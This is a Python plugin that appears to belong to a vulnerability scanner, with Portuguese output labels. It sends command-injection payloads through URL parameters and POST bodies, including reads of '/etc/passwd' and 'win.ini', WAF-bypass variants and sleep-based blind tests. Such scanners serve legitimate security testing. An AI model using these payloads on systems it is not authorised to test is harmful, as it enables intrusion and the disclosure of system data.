# plugins/rce_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner RCE (Remote Code Execution) / Command Injection.
    2026 Intel: React2Shell (CVE-2025-55182), ToolShell (CVE-2025-53770),
    Apache Tomcat (CVE-2025-24813), Oracle Fusion (CVE-2026-21992).
    Techniques: time-based, output-based, OOB DNS, blind chaining.
    """
    import requests
    import time

    params = ["cmd", "exec", "command", "run", "ping", "query", "jump",
              "code", "reg", "do", "func", "arg", "option", "load",
              "process", "step", "read", "feature", "exe", "module",
              "payload", "input", "ip", "host", "target"]
    payloads = [
        # Output-based
        (";id", "uid=", "SEMICOLON_ID"),
        ("|id", "uid=", "PIPE_ID"),
        ("$(id)", "uid=", "DOLLAR_ID"),
        ("`id`", "uid=", "BACKTICK_ID"),
        (";whoami", "root", "SEMICOLON_WHOAMI"),
        ("|cat /etc/hostname", "", "PIPE_HOSTNAME"),
        # Windows
        (";dir C:\\", "Volume", "WIN_DIR"),
        ("|type C:\\Windows\\win.ini", "[fonts]", "WIN_INI"),
        ("& ipconfig", "IPv4", "WIN_IPCONFIG"),
        # WAF bypass 2026
        (";{cat,/etc/passwd}", "root:", "IFS_BYPASS"),
        (";c''at /etc/passwd", "root:", "QUOTE_BYPASS"),
        (";c\\at /etc/passwd", "root:", "BACKSLASH_BYPASS"),
        (";$(printf '\\x63\\x61\\x74') /etc/passwd", "root:", "HEX_BYPASS"),
        (";cat$IFS/etc/passwd", "root:", "IFS_VAR"),
        # Newline injection
        ("%0aid", "uid=", "NEWLINE_INJECT"),
        ("%0d%0aid", "uid=", "CRLF_INJECT"),
    ]
    time_payloads = [
        (";sleep 4", "UNIX_SLEEP"),
        ("|sleep 4", "PIPE_SLEEP"),
        ("$(sleep 4)", "DOLLAR_SLEEP"),
        ("`sleep 4`", "BACKTICK_SLEEP"),
        (";ping -c 4 127.0.0.1", "PING_4"),
        ("& timeout /T 4", "WIN_TIMEOUT"),
    ]
    vulns = []

    for param in params:
        # Output-based
        for payload, indicator, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=8)
                if indicator and indicator in resp.text:
                    vulns.append({
                        "tipo": "RCE_OUTPUT", "metodo": method,
                        "parametro": param, "severidade": "CRITICO",
                        "descricao": f"Command execution confirmada via {method}!",
                        "amostra": resp.text[:200],
                    })
                    break
            except Exception:
                continue

        # Time-based
        for payload, method in time_payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                start = time.time()
                requests.get(url, timeout=10)
                elapsed = time.time() - start
                if elapsed > 3.5:
                    vulns.append({
                        "tipo": "RCE_TIME_BASED", "metodo": method,
                        "parametro": param, "severidade": "CRITICO",
                        "tempo": round(elapsed, 2),
                    })
                    break
            except requests.Timeout:
                vulns.append({
                    "tipo": "RCE_TIME_BASED", "metodo": method,
                    "parametro": param, "severidade": "ALTO",
                    "timeout": True,
                })
                break
            except Exception:
                continue

        # POST body injection
        for payload, indicator, method in payloads[:6]:
            try:
                resp = requests.post(f"http://{target}/", json={param: payload}, timeout=6)
                if indicator and indicator in resp.text:
                    vulns.append({
                        "tipo": "RCE_POST_BODY", "metodo": method,
                        "parametro": param, "severidade": "CRITICO",
                    })
                    break
            except Exception:
                continue

    return {"plugin": "rce_scanner", "resultados": vulns if vulns else "Nenhum RCE detectado"}
